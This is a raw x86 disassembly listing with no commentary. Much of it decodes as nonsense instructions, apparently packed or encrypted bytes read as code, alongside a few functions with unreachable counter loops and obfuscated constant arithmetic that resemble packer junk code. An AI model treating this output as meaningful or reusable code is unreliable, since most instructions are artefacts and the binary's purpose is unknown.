  40f58b:	mov    dl,0x4e
  40f58d:	jmp    0xd5a:0xe1550f46
  40f594:	jg     0x40f5e6
  40f596:	test   al,0xd5
  40f598:	stc    
  40f599:	add    DWORD PTR [ebx],eax
  40f59b:	mov    edx,0x43c9cd49
  40f5a0:	add    BYTE PTR [ecx+0x26f37dfe],dl
  40f5a6:	jne    0x40f5cd
  40f5a8:	cld    
  40f5a9:	jne    0x40f57a
  40f5ab:	or     DWORD PTR [ebp+0x3198e5c8],esp
  40f5b1:	sbb    BYTE PTR [edi+0x7a],ch
  40f5b4:	pop    ecx
  40f5b5:	inc    edi
  40f5b6:	lahf   
  40f5b7:	repz adc eax,0xaacda8d3
  40f5bd:	out    0x47,al
  40f5bf:	jae    0x40f5ef
  40f5c1:	inc    BYTE PTR [esi]
  40f5c3:	inc    edx
  40f5c4:	sbb    al,0xaa
  40f5c6:	lahf   
  40f5c7:	sti    
  40f5c8:	retf   
  40f5c9:	mov    dh,BYTE PTR [eax+eax*8-0x5f]
  40f5cd:	call   0x82d5:0x36578cbc
  40f5d4:	arpl   WORD PTR [eax-0x2ad71d9c],si
  40f5da:	inc    ebp
  40f5db:	xor    al,BYTE PTR [edx-0x57]
  40f5de:	ret    0x8280
  40f5e1:	push   esi
  40f5e2:	push   esp
  40f5e3:	mov    ds:0x2a37d7a6,eax
  40f5e8:	mov    bh,0xf1
  40f5ea:	popf   
  40f5eb:	dec    esp
  40f5ec:	jne    0x40f60d
  40f5ee:	sub    DWORD PTR [ecx-0x3f53f0d2],ebp
  40f5f4:	mov    ebx,0xcc208a8
  40f5f9:	xor    al,0x5b
  40f5fb:	(bad)  
  40f5fc:	pop    ecx
  40f5fd:	imul   esp,DWORD PTR [ebp-0x64],0x6c
  40f601:	pop    esi
  40f602:	push   ebx
  40f603:	pushf  
  40f604:	pop    edi
  40f605:	jo     0x40f636
  40f607:	push   es
  40f608:	push   edi
  40f609:	inc    edx
  40f60a:	xchg   edi,eax
  40f60b:	inc    BYTE PTR [ecx]
  40f60d:	cmp    BYTE PTR [ebp-0xc],dl
  40f610:	sub    eax,0x1f9af5d8
  40f615:	loopne 0x40f5c1
  40f617:	shr    ebp,cl
  40f619:	xor    al,0x53
  40f61b:	inc    ebx
  40f61c:	hlt    
  40f61d:	fs in  eax,0x4b
  40f620:	mov    ds:0x91bff299,al
  40f625:	pushf  
  40f626:	gs mov esp,0x4c8ac1c7
  40f62c:	pop    esi
  40f62d:	jb     0x40f66c
  40f62f:	test   al,0x63
  40f631:	xchg   ebp,eax
  40f632:	int3   
  40f633:	xchg   ecx,eax
  40f634:	ret    
  40f635:	fist   DWORD PTR [esi-0x20]
  40f638:	mov    ecx,0x6cf615e7
  40f63d:	pusha  
  40f63e:	mov    ah,0x7e
  40f640:	cdq    
  40f641:	pavgb  mm6,QWORD PTR [ebx+0x5cbac564]
  40f648:	add    DWORD PTR [ecx+0x723193f3],edx
  40f64e:	sbb    dh,al
  40f650:	(bad)  
  40f652:	or     BYTE PTR [ebx+0x53],ah
  40f655:	jmp    0xd7b5ddb0
  40f65a:	in     eax,0x2c
  40f65c:	jmp    0x909d:0xfa6b0b02
  40f663:	xor    ecx,DWORD PTR [ecx-0x80]
  40f666:	les    ecx,FWORD PTR [edx-0x4c5816ea]
  40f66c:	iret   
  40f66d:	call   0xa212:0xad715ad4
  40f674:	sub    DWORD PTR [ecx],ecx
  40f676:	sar    BYTE PTR [ecx-0x5699cad5],cl
  40f67c:	fs jae 0x40f68a
  40f67f:	js     0x40f65b
  40f681:	jne    0x40f652
  40f683:	mov    esi,0x85917a6b
  40f688:	jmp    esi
  40f68a:	push   esp
  40f68b:	ret    0xa208
  40f68e:	test   al,0xb1
  40f690:	popa   
  40f691:	mov    ecx,0x8c8c9f1c
  40f696:	adc    BYTE PTR [edi],cl
  40f698:	aas    
  40f699:	mov    ds:0xea329b69,eax
  40f69e:	xor    BYTE PTR [eax-0x333be6da],bl
  40f6a4:	xchg   DWORD PTR [ebp+eiz*8+0x790b602a],ecx
  40f6ab:	mov    dl,BYTE PTR [esi-0x3b]
  40f6ae:	mov    eax,ds:0x43b47b06
  40f6b3:	mov    cs,WORD PTR [ecx+ebp*4+0x1ba265ef]
  40f6ba:	in     al,dx
  40f6bb:	out    dx,eax
  40f6bc:	sbb    eax,0x89b79f5d
  40f6c1:	pop    ecx
  40f6c2:	or     ebp,esp
  40f6c4:	aaa    
  40f6c5:	xchg   edi,eax
  40f6c6:	jnp    0x40f6fd
  40f6c8:	jp     0x40f6ad
  40f6ca:	pop    ebx
  40f6cb:	lds    esp,FWORD PTR [esi]
  40f6cd:	adc    DWORD PTR [eax],edx
  40f6cf:	int    0x1d
  40f6d1:	(bad)  
  40f6d2:	aam    0x9d
  40f6d4:	inc    eax
  40f6d5:	xchg   esp,eax
  40f6d6:	stos   DWORD PTR es:[edi],eax
  40f6d7:	pop    ebp
  40f6d8:	fild   WORD PTR [esi*2+0x4ca85c41]
  40f6df:	xor    dh,0x95
  40f6e2:	ret    
  40f6e3:	mov    ebp,0x4956e163
  40f6e8:	dec    ebx
  40f6e9:	jg     0x40f723
  40f6eb:	xchg   esi,eax
  40f6ec:	out    dx,eax
  40f6ed:	cmp    BYTE PTR [eax-0x7b],0xa1
  40f6f1:	in     eax,0x20
  40f6f3:	lods   al,BYTE PTR ds:[esi]
  40f6f4:	sub    edx,edi
  40f6f6:	ret    
  40f6f7:	or     eax,0xd
  40f6fa:	std    
  40f6fb:	hlt    
  40f6fc:	out    dx,eax
  40f6fd:	sbb    eax,0x4472f064
  40f702:	mov    ebx,0x8aa852f0
  40f707:	imul   ebx,DWORD PTR [edx],0x18
  40f70a:	dec    ebx
  40f70b:	mov    ds:0x7262d6fa,eax
  40f710:	(bad)  
  40f711:	pop    ecx
  40f712:	fwait
  40f713:	sahf   
  40f714:	inc    ch
  40f716:	fild   QWORD PTR [esi+0x62]
  40f719:	push   0x4a
  40f71b:	call   0x5db3b74f
  40f720:	leave  
  40f721:	jg     0x40f790
  40f723:	lea    ebp,[edi+0x76035dd2]
  40f729:	ret    
  40f72a:	lods   eax,DWORD PTR ds:[esi]
  40f72b:	iret   
  40f72c:	cmp    bh,dh
  40f72e:	xchg   esp,eax
  40f72f:	fucomip st,st(5)
  40f731:	sbb    al,0xf0
  40f733:	push   edi
  40f734:	sbb    bh,BYTE PTR [edi+0x665e7408]
  40f73a:	mov    edi,ds
  40f73c:	push   0x7d
  40f73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f73f:	bound  ebp,QWORD PTR [ebp+0x61c7e5e9]
  40f745:	sub    cl,BYTE PTR [edi]
  40f747:	add    al,0xe8
  40f749:	push   esi
  40f74a:	fistp  WORD PTR [edi-0x7840cd2f]
  40f750:	out    dx,al
  40f751:	fld    DWORD PTR [eax-0x26865f2f]
  40f757:	shr    DWORD PTR [ebp*2+0x69066919],cl
  40f75e:	mov    ds:0x35c42d88,eax
  40f763:	push   esi
  40f764:	pop    edx
  40f765:	cdq    
  40f766:	lods   eax,DWORD PTR ds:[esi]
  40f767:	ja     0x40f784
  40f769:	pop    edi
  40f76a:	and    al,0xdb
  40f76c:	cmp    BYTE PTR [edx-0x2c4429a1],cl
  40f772:	jl     0x40f7e1
  40f774:	bound  eax,QWORD PTR [eax-0x5]
  40f777:	std    
  40f778:	fs stc 
  40f77a:	mov    WORD PTR [edx-0x32],fs
  40f77d:	loop   0x40f7c5
  40f77f:	sub    ebp,ecx
  40f781:	scas   eax,DWORD PTR es:[edi]
  40f782:	and    al,0x68
  40f784:	test   al,0xf9
  40f786:	sub    DWORD PTR [esi],ebx
  40f788:	(bad)  
  40f789:	push   esi
  40f78a:	repz mov WORD PTR [ebx],fs
  40f78d:	inc    eax
  40f78e:	push   ss
  40f78f:	jl     0x40f7ed
  40f791:	jmp    0xc04cfeab
  40f796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f797:	and    esi,DWORD PTR [eax]
  40f799:	call   0x74c4:0xd7499dc5
  40f7a0:	xor    DWORD PTR [ecx],0xffffffbd
  40f7a3:	sbb    edx,DWORD PTR [edx+0x1fa93dde]
  40f7a9:	aaa    
  40f7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ab:	fbld   TBYTE PTR [esi-0x3f]
  40f7ae:	shl    DWORD PTR [ebx+0x54],0xf9
  40f7b2:	in     al,dx
  40f7b3:	adc    esp,DWORD PTR [edi-0x24]
  40f7b6:	or     eax,0x4907a1c4
  40f7bb:	and    DWORD PTR [ebp+0x7fae73d2],0xffffffa0
  40f7c2:	inc    edi
  40f7c3:	or     edx,DWORD PTR [ebp-0x6a908e9d]
  40f7c9:	mov    BYTE PTR [ebp+ecx*1+0xb],ah
  40f7cd:	sub    al,0xd8
  40f7cf:	retf   
  40f7d0:	ja     0x40f7ba
  40f7d2:	das    
  40f7d3:	(bad)  
  40f7d4:	push   cs
  40f7d5:	cmp    dh,dl
  40f7d7:	int    0x42
  40f7d9:	lahf   
  40f7da:	test   al,0x3f
  40f7dc:	add    ebx,DWORD PTR ds:[eax+eax*4+0x2]
  40f7e1:	and    BYTE PTR [ebx],0x87
  40f7e4:	inc    ebp
  40f7e5:	aad    0xe3
  40f7e7:	pop    esi
  40f7e8:	arpl   WORD PTR [esi-0x451c5687],bx
  40f7ee:	test   al,cl
  40f7f0:	cmp    ecx,ebp
  40f7f2:	inc    ecx
  40f7f3:	pop    edi
  40f7f4:	inc    eax
  40f7f5:	or     DWORD PTR [esi+0x4c],0x76
  40f7f9:	in     eax,dx
  40f7fa:	dec    edi
  40f7fb:	addr16 xchg esi,eax
  40f7fd:	push   ss
  40f7fe:	aad    0x2d
  40f800:	ret    
  40f801:	mov    ?,WORD PTR ds:0x8976a3d
  40f807:	(bad)  [ebx-0xa739535]
  40f80d:	mov    ds:0xd2338460,al
  40f812:	(bad)  
  40f813:	es popf 
  40f815:	sub    al,0xb5
  40f817:	mov    esp,0x3a215b22
  40f81c:	xor    al,0x31
  40f81e:	mov    BYTE PTR [edi+0x4c094c56],cl
  40f824:	push   ebx
  40f825:	add    eax,0x47ab31d6
  40f82a:	mov    esp,0xe812fcf4
  40f82f:	je     0x40f7c9
  40f831:	or     DWORD PTR [esi+ecx*4-0xb],0xfffffff4
  40f836:	push   ss
  40f837:	lds    ecx,FWORD PTR [ebp-0x6a]
  40f83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f83b:	iret   
  40f83c:	sub    DWORD PTR [edi+0x29],eax
  40f83f:	lock mov WORD PTR [eax-0x50422d5b],ds
  40f846:	fwait
  40f847:	das    
  40f848:	in     eax,dx
  40f849:	enter  0x56ae,0x50
  40f84d:	or     dh,ah
  40f84f:	and    DWORD PTR ds:0x9190358d,ebp
  40f855:	dec    eax
  40f856:	xchg   ecx,eax
  40f857:	dec    ecx
  40f858:	xchg   ecx,edx
  40f85a:	dec    edx
  40f85b:	push   edx
  40f85c:	mov    edx,ebx
  40f85e:	pop    ebx
  40f85f:	dec    ebx
  40f860:	call   DWORD PTR [ebx]
  40f862:	cmp    DWORD PTR [ebp+0x10],esi
  40f865:	je     0x40f884
  40f86b:	xchg   edx,eax
  40f86c:	push   0xb
  40f86e:	pop    ecx
  40f86f:	push   0x4
  40f871:	pop    ebx
  40f872:	inc    ebx
  40f873:	xchg   ebx,ecx
  40f875:	sub    ebx,ecx
  40f877:	xchg   ebx,ecx
  40f879:	dec    ecx
  40f87a:	dec    ecx
  40f87b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f87e:	imul   eax,ecx
  40f881:	add    esp,eax
  40f883:	xchg   edx,eax
  40f884:	push   eax
  40f885:	xor    ebx,ebx
  40f887:	mov    edx,esp
  40f889:	dec    edx
  40f88a:	inc    ebx
  40f88b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f88e:	dec    ebx
  40f88f:	xor    edx,edx
  40f891:	add    DWORD PTR [ebp-0xc],ebx
  40f894:	pop    ebx
  40f895:	mov    eax,DWORD PTR [ebp-0xc]
  40f898:	pop    edi
  40f899:	pop    esi
  40f89a:	pop    ebx
  40f89b:	leave  
  40f89c:	ret    0x10
  40f89f:	push   ebp
  40f8a0:	mov    ebp,esp
  40f8a2:	push   ecx
  40f8a3:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40f8aa:	add    DWORD PTR ds:0x42c010,0x33e6
  40f8b4:	mov    eax,DWORD PTR [ebp-0x4]
  40f8b7:	or     edx,ecx
  40f8b9:	mov    edx,DWORD PTR [ebp+0x10]
  40f8bc:	mov    ecx,0x7510893
  40f8c1:	xor    eax,ecx
  40f8c3:	and    DWORD PTR ds:0x42d008,0x1b89
  40f8cd:	add    eax,0x3272db
  40f8d2:	or     DWORD PTR ds:0x42a01c,0x429008
  40f8dc:	mov    DWORD PTR [edx],eax
  40f8de:	and    DWORD PTR ds:0x42c01c,0x0
  40f8e8:	xor    eax,eax
  40f8ea:	add    eax,DWORD PTR ds:0x42c01c
  40f8f0:	inc    eax
  40f8f1:	mov    ds:0x42c01c,eax
  40f8f6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f8fd:	jne    0x40f90f
  40f903:	push   DWORD PTR [ebp-0x20]
  40f906:	push   DWORD PTR [ebp-0x20]
  40f909:	call   DWORD PTR ds:0x425034
  40f90f:	cmp    DWORD PTR ds:0x42c01c,0x1d
  40f916:	jb     0x40f8e8
  40f91c:	and    DWORD PTR ds:0x42d01c,0x0
  40f926:	jmp    0x40f938
  40f92b:	mov    edx,DWORD PTR ds:0x42d01c
  40f931:	inc    edx
  40f932:	mov    DWORD PTR ds:0x42d01c,edx
  40f938:	cmp    DWORD PTR ds:0x42d01c,0x1b
  40f93f:	jae    0x40f96c
  40f945:	cmp    DWORD PTR ds:0x42d01c,0x1d
  40f94c:	jne    0x40f967
  40f952:	push   0x4244d9
  40f957:	push   0x424489
  40f95c:	push   0x42c7
  40f961:	call   DWORD PTR ds:0x42503c
  40f967:	jmp    0x40f92b
  40f96c:	mov    eax,DWORD PTR [ebp+0xc]
  40f96f:	xor    eax,ecx
  40f971:	push   esi
  40f972:	mov    esi,DWORD PTR [ebp+0x10]
  40f975:	mov    edx,0x3272db
  40f97a:	add    eax,edx
  40f97c:	mov    DWORD PTR [esi+0x4],eax
  40f97f:	mov    eax,DWORD PTR [ebp+0x14]
  40f982:	mov    esi,DWORD PTR [ebp+0x10]
  40f985:	mov    DWORD PTR [esi+0x8],eax
  40f988:	mov    eax,DWORD PTR [ebp+0x18]
  40f98b:	mov    esi,DWORD PTR [ebp+0x10]
  40f98e:	mov    DWORD PTR [esi+0xc],eax
  40f991:	mov    eax,DWORD PTR [ebp+0x1c]
  40f994:	mov    esi,DWORD PTR [ebp+0x10]
  40f997:	mov    DWORD PTR [esi+0x10],eax
  40f99a:	mov    eax,DWORD PTR [ebp+0x8]
  40f99d:	xor    eax,ecx
  40f99f:	add    eax,edx
  40f9a1:	pop    esi
  40f9a2:	leave  
  40f9a3:	ret    0x18
  40f9a6:	push   ebp
  40f9a7:	mov    ebp,esp
  40f9a9:	mov    eax,ds:0x423f7f
  40f9ae:	mov    eax,DWORD PTR [eax+0x1c8]
  40f9b4:	mov    eax,DWORD PTR [eax]
  40f9b6:	movzx  ecx,BYTE PTR ds:0x429000
  40f9bd:	and    DWORD PTR ds:0x42d010,ecx
  40f9c3:	cdq    
  40f9c4:	push   ebx
  40f9c5:	add    DWORD PTR ds:0x42a008,0x429020
  40f9cf:	mov    ecx,0xfabdbef1
  40f9d4:	add    eax,ecx
  40f9d6:	mov    DWORD PTR ds:0x42d008,0x7e66
  40f9e0:	adc    edx,0xffffffff
  40f9e3:	or     DWORD PTR ds:0x42a014,edi
  40f9e9:	push   esi
  40f9ea:	push   edi
  40f9eb:	and    DWORD PTR ds:0x42a00c,0x0
  40f9f5:	jmp    0x40fa09
  40f9fa:	xor    ebx,ebx
  40f9fc:	or     ebx,DWORD PTR ds:0x42a00c
  40fa02:	inc    ebx
  40fa03:	mov    DWORD PTR ds:0x42a00c,ebx
  40fa09:	cmp    DWORD PTR ds:0x42a00c,0x1b
  40fa10:	jae    0x40fa41
  40fa16:	cmp    DWORD PTR ds:0x42a00c,0x26
  40fa1d:	jne    0x40fa36
  40fa23:	push   0x7619
  40fa28:	push   0x3c20
  40fa2d:	push   DWORD PTR [ebp-0x18]
  40fa30:	call   DWORD PTR ds:0x425040
  40fa36:	jmp    0x40f9fa
  40fa3b:	adc    ebx,DWORD PTR ds:0x42d018
  40fa41:	mov    edi,edx
  40fa43:	mov    edx,DWORD PTR [ebp+0x8]
  40fa46:	mov    DWORD PTR ds:0x42c000,0x5718
  40fa50:	mov    ebx,eax
  40fa52:	and    DWORD PTR ds:0x42c004,0x67ab
  40fa5c:	mov    eax,0x8a29a123
  40fa61:	xor    esi,esi
  40fa63:	or     DWORD PTR ds:0x429024,0x42d014
  40fa6d:	xor    ebx,eax
  40fa6f:	or     DWORD PTR ds:0x42d000,0x42a014
  40fa79:	xor    edi,0x0
  40fa7c:	and    DWORD PTR ds:0x42d000,0x42a00c
  40fa86:	add    edx,ecx
  40fa88:	adc    esi,0xffffffff
  40fa8b:	xor    edx,eax
  40fa8d:	or     DWORD PTR ds:0x42c010,0x42b010
  40fa97:	jmp    0x411e4e
  40fa9c:	mov    WORD PTR [ebx+0x6643964b],?
  40faa2:	arpl   WORD PTR [ebx+0x42],sp
  40faa5:	jno    0x40fa92
  40faa7:	shr    BYTE PTR [esi+edx*4-0x7187c922],cl
  40faae:	bound  esp,QWORD PTR [edx-0x38]
  40fab1:	pop    edi
  40fab2:	bound  esp,QWORD PTR [edx+0x9]
  40fab5:	je     0x40fa64
  40fab7:	lds    eax,FWORD PTR [ebp+0x3ff4ee81]
  40fabd:	push   ss
  40fabe:	pop    eax
  40fabf:	imul   ebx,DWORD PTR [ebp-0x1d2bff8b],0x1bb2a878
  40fac9:	mov    edx,0x2cbfe0ea
  40face:	aas    
  40facf:	in     eax,0x68
  40fad1:	mov    eax,0x665b5fa7
  40fad6:	fsub   DWORD PTR [ebx]
  40fad8:	sub    esp,DWORD PTR [eax]
  40fada:	mov    ebx,0xd11793ee
  40fadf:	xlat   BYTE PTR es:[ebx]
  40fae1:	mov    ds:0xb5309237,al
  40fae6:	or     ch,ah
  40fae8:	add    eax,0x1a82e311
  40faed:	jmp    0x8b3744bc
  40faf2:	or     ah,BYTE PTR [edx-0x77ab4ba9]
  40faf8:	push   ecx
  40faf9:	je     0x40fb75
  40fafb:	aad    0x19
  40fafd:	jmp    0x5dff:0x47ad8b9e
  40fb04:	or     eax,0x128306f7
  40fb09:	es jg  0x40fb6c
  40fb0c:	lock mov ebx,0x4c293c92
  40fb12:	or     DWORD PTR [edi+0x51],ebp
  40fb15:	mov    esi,0x9b884ee2
  40fb1a:	cli    
  40fb1b:	daa    
  40fb1c:	pmaxsw mm4,QWORD PTR [esi+edx*2+0x16ec3610]
  40fb24:	pop    ds
  40fb25:	std    
  40fb26:	ins    BYTE PTR es:[edi],dx
  40fb27:	aas    
  40fb28:	stos   DWORD PTR es:[edi],eax
  40fb29:	test   DWORD PTR [eax],esi
  40fb2b:	fdiv   DWORD PTR [edi]
  40fb2d:	into   
  40fb2e:	je     0x40fb46
  40fb30:	int    0x60
  40fb32:	jns    0x40fb54
  40fb34:	mov    ebx,0x452c177
  40fb39:	sub    bh,BYTE PTR [ecx]
  40fb3b:	xor    esp,DWORD PTR [ecx-0x4d]
  40fb3e:	push   DWORD PTR [esi-0x71]
  40fb41:	out    dx,eax
  40fb42:	scas   al,BYTE PTR es:[edi]
  40fb43:	mov    edi,0x86d8232b
  40fb48:	xor    DWORD PTR [edi-0x1b],edi
  40fb4b:	jecxz  0x40fb5d
  40fb4d:	mov    dh,0xb4
  40fb4f:	aas    
  40fb50:	frstor [ecx+0x72]
  40fb53:	ret    0xdc9d
  40fb56:	xor    BYTE PTR [edx-0x443db0f],dl
  40fb5c:	cld    
  40fb5d:	cli    
  40fb5e:	std    
  40fb5f:	rol    BYTE PTR [edi],cl
  40fb61:	repz cmp ch,BYTE PTR [edi+0x18dbab3f]
  40fb68:	xor    eax,0x97024902
  40fb6d:	push   ebx
  40fb6e:	std    
  40fb6f:	xor    al,0x31
  40fb71:	popa   
  40fb72:	test   BYTE PTR [esi-0x792d46aa],0xf4
  40fb79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb7a:	mov    bh,0x50
  40fb7c:	dec    edi
  40fb7d:	inc    ebx
  40fb7e:	dec    esi
  40fb7f:	inc    esi
  40fb80:	cmp    ch,BYTE PTR [ebx]
  40fb82:	and    al,cl
  40fb84:	mov    ebx,0x7d3a6603
  40fb89:	add    eax,0x415de39f
  40fb8e:	xor    DWORD PTR [ecx-0x16],0x5b9497eb
  40fb95:	imul   esp,DWORD PTR [ecx-0x5a],0x5d3502f3
  40fb9c:	(bad)  
  40fb9d:	or     al,0x55
  40fb9f:	xchg   ebp,eax
  40fba0:	and    eax,0x51167df1
  40fba5:	cli    
  40fba6:	inc    ebx
  40fba7:	pop    esp
  40fba8:	ror    BYTE PTR [edx+0x3decb071],0x49
  40fbaf:	adc    eax,0xb41f84f3
  40fbb4:	ret    0xd0cb
  40fbb7:	sub    ah,bh
  40fbb9:	pop    esp
  40fbba:	das    
  40fbbb:	push   cs
  40fbbc:	outs   dx,BYTE PTR ds:[esi]
  40fbbd:	sbb    BYTE PTR ds:0xa7c245ac,dl
  40fbc3:	retf   0x3bf1
  40fbc6:	xchg   ebx,eax
  40fbc7:	pop    ecx
  40fbc8:	ja     0x40fc12
  40fbca:	sub    eax,0x938febc0
  40fbcf:	add    eax,0x9dadd799
  40fbd4:	xor    ebx,ebp
  40fbd6:	jno    0x40fbf2
  40fbd8:	stos   DWORD PTR es:[edi],eax
  40fbd9:	pop    ds
  40fbda:	inc    edx
  40fbdb:	or     al,0x27
  40fbdd:	cmp    DWORD PTR [eax-0x5454ff03],ebx
  40fbe3:	into   
  40fbe4:	jmp    0x891f:0x3a595001
  40fbeb:	xchg   edi,eax
  40fbec:	jb     0x40fc58
  40fbee:	push   0xffffffc8
  40fbf0:	and    eax,0x5eacf4f7
  40fbf5:	(bad)  
  40fbf6:	es jmp 0x40fc2a
  40fbf9:	lss    ecx,FWORD PTR [esi-0x9746e49]
  40fc00:	mov    ah,0x95
  40fc02:	ins    BYTE PTR es:[edi],dx
  40fc03:	call   0x4bcf5981
  40fc08:	mov    bl,0x87
  40fc0a:	retf   0x8f4e
  40fc0d:	in     eax,0xc4
  40fc0f:	leave  
  40fc10:	dec    edi
  40fc11:	mov    bh,0xc0
  40fc13:	fistp  QWORD PTR [edx+0x6e]
  40fc16:	cmp    eax,0xa55210a7
  40fc1b:	pop    esp
  40fc1c:	jb     0x40fc66
  40fc1e:	ins    BYTE PTR es:[edi],dx
  40fc1f:	adc    eax,0xfca575f4
  40fc24:	outs   dx,BYTE PTR ds:[esi]
  40fc25:	pop    esi
  40fc26:	mov    ebx,0x9b8861f9
  40fc2b:	outs   dx,BYTE PTR ds:[esi]
  40fc2c:	(bad)
  40fc30:	shl    DWORD PTR [ebx],0xc5
  40fc33:	fistp  QWORD PTR [edi+0x68]
  40fc36:	adc    ch,ch
  40fc38:	cmp    dl,ah
  40fc3a:	mov    ds:0x538718e5,eax
  40fc3f:	fwait
  40fc40:	adc    ecx,edx
  40fc42:	es xor bx,sp
  40fc46:	sahf   
  40fc47:	dec    edx
  40fc48:	into   
  40fc49:	scas   eax,DWORD PTR es:[edi]
  40fc4a:	xchg   edi,eax
  40fc4b:	jle    0x40fc9e
  40fc4d:	or     al,0x43
  40fc4f:	mov    eax,0x1eeb9ee9
  40fc54:	cld    
  40fc55:	xchg   ebx,eax
  40fc56:	cmp    eax,0x5b4e6aaa
  40fc5b:	push   0xffffffcb
  40fc5d:	cli    
  40fc5e:	jge    0x40fc4e
  40fc60:	ss sub al,0x12
  40fc63:	aas    
  40fc64:	jl     0x40fbea
  40fc66:	(bad)  
  40fc67:	fisubr WORD PTR [eax+0x63]
  40fc6a:	pop    eax
  40fc6b:	dec    eax
  40fc6c:	rol    BYTE PTR [ebx+0x74],cl
  40fc6f:	and    BYTE PTR [esp+ecx*2],0xa8
  40fc73:	outs   dx,BYTE PTR ds:[esi]
  40fc74:	loope  0x40fcd1
  40fc76:	cmc    
  40fc77:	pop    es
  40fc78:	in     eax,0x9f
  40fc7a:	pop    esi
  40fc7b:	jnp    0x40fc37
  40fc7d:	retf   
  40fc7e:	pop    ebp
  40fc7f:	push   ds
  40fc80:	test   al,0x53
  40fc82:	test   eax,0xe08fdce
  40fc87:	lds    ecx,FWORD PTR [ebp-0xc]
  40fc8a:	inc    esp
  40fc8b:	xlat   BYTE PTR ds:[ebx]
  40fc8c:	shl    BYTE PTR [ebx+0x66],1
  40fc8f:	daa    
  40fc90:	ficomp DWORD PTR [esi+0xe70146e]
  40fc96:	stos   BYTE PTR es:[edi],al
  40fc97:	rcl    BYTE PTR [edx],cl
  40fc99:	nop
  40fc9a:	xor    al,BYTE PTR [ebp*4-0x16c32e49]
  40fca1:	mov    fs,WORD PTR [esi-0x256915d5]
  40fca7:	aad    0x4f
  40fca9:	test   DWORD PTR [edi+edi*8+0x2c841042],ebp
  40fcb0:	ins    BYTE PTR es:[edi],dx
  40fcb1:	add    edx,esi
  40fcb3:	or     dl,BYTE PTR [ebx-0x65]
  40fcb6:	mov    ds:0x185c6139,al
  40fcbb:	push   ss
  40fcbc:	fisttp QWORD PTR [esi-0x74aa86a1]
  40fcc2:	jmp    0x40fd2f
  40fcc4:	je     0x40fca5
  40fcc6:	es retf 0x42e
  40fcca:	fsub   st(1),st
  40fccc:	lods   al,BYTE PTR ds:[esi]
  40fccd:	xor    al,0x90
  40fccf:	add    eax,0x22e2492a
  40fcd4:	jmp    0x40fccd
  40fcd6:	(bad)  
  40fcd8:	sbb    DWORD PTR [edx],edi
  40fcda:	push   DWORD PTR [edi+edx*8]
  40fcdd:	lods   eax,DWORD PTR ds:[esi]
  40fcde:	jl     0x40fcf8
  40fce0:	jbe    0x40fc98
  40fce2:	ja     0x40fd4f
  40fce4:	mov    WORD PTR [edx+0x39],ds
  40fce7:	mov    edx,0xb69e9937
  40fcec:	dec    eax
  40fced:	or     edx,eax
  40fcef:	ror    DWORD PTR [esi+edx*2],0xac
  40fcf3:	clc    
  40fcf4:	mov    ch,cl
  40fcf6:	rol    BYTE PTR [esp+esi*8],1
  40fcf9:	cs jmp 0xc098aa4a
  40fcff:	loopne 0x40fd5e
  40fd01:	push   cs
  40fd02:	jns    0x40fc90
  40fd04:	inc    eax
  40fd05:	repnz sub dl,BYTE PTR [bp-0xb]
  40fd0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd0b:	xchg   edx,eax
  40fd0c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40fd0e:	and    edi,DWORD PTR [esi]
  40fd10:	xor    DWORD PTR [eax],ecx
  40fd12:	dec    esi
  40fd13:	pop    es
  40fd14:	add    bh,0x5d
  40fd17:	(bad)  
  40fd18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd19:	mov    esi,0x760e825f
  40fd1e:	icebp  
  40fd1f:	ror    BYTE PTR [ebx],1
  40fd21:	xor    BYTE PTR [ebx+eax*4],0xef
  40fd25:	jmp    0x7f96:0x68068f45
  40fd2c:	inc    esi
  40fd2d:	fistp  QWORD PTR [ecx+0xe807760]
  40fd33:	cli    
  40fd34:	jno    0x40fdb2
  40fd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd37:	mov    WORD PTR [ebp-0x40],ss
  40fd3a:	dec    eax
  40fd3b:	(bad)  
  40fd3c:	(bad)  
  40fd3e:	in     eax,0x11
  40fd40:	(bad)  
  40fd41:	imul   ebp,DWORD PTR [edi+0x1bcf5880],0x67624e7e
  40fd4b:	pop    ecx
  40fd4c:	aaa    
  40fd4d:	pop    ebx
  40fd4e:	mov    ebp,eax
  40fd50:	xchg   bh,cl
  40fd52:	sti    
  40fd53:	cmp    ch,BYTE PTR [eax+0x4b]
  40fd56:	mov    ebx,0x71442324
  40fd5b:	in     eax,0xfc
  40fd5d:	sub    DWORD PTR [esi-0x2150c416],ebp
  40fd63:	or     bh,BYTE PTR [edx]
  40fd65:	cdq    
  40fd66:	lea    ebp,[eax+0x7d11d73b]
  40fd6c:	push   ss
  40fd6d:	adc    DWORD PTR [ecx],0xf61e9258
  40fd73:	ins    BYTE PTR es:[edi],dx
  40fd74:	mov    ?,WORD PTR [ecx]
  40fd76:	cmp    dl,bh
  40fd78:	shr    DWORD PTR [ecx+0x4e],1
  40fd7b:	add    esp,DWORD PTR ds:0xcb0d3b82
  40fd81:	(bad)  
  40fd82:	dec    ebx
  40fd83:	adc    BYTE PTR [eax],ah
  40fd85:	dec    esp
  40fd86:	or     DWORD PTR [ebp+0x31],ecx
  40fd89:	outs   dx,BYTE PTR ds:[esi]
  40fd8a:	inc    edx
  40fd8b:	ret    0x8237
  40fd8e:	push   0x6b
  40fd90:	ins    DWORD PTR es:[edi],dx
  40fd91:	out    dx,eax
  40fd92:	jns    0x40fddd
  40fd94:	stos   DWORD PTR es:[edi],eax
  40fd95:	dec    edx
  40fd96:	dec    eax
  40fd97:	dec    edx
  40fd98:	daa    
  40fd99:	iret   
  40fd9a:	add    DWORD PTR [ebx+0x6],edx
  40fd9d:	shr    ecx,1
  40fd9f:	push   ebx
  40fda0:	dec    esi
  40fda1:	cwde   
  40fda2:	or     dh,BYTE PTR [eax+edi*2]
  40fda5:	ja     0x40fe10
  40fda7:	sub    edx,DWORD PTR [edi]
  40fda9:	jnp    0x40fdaf
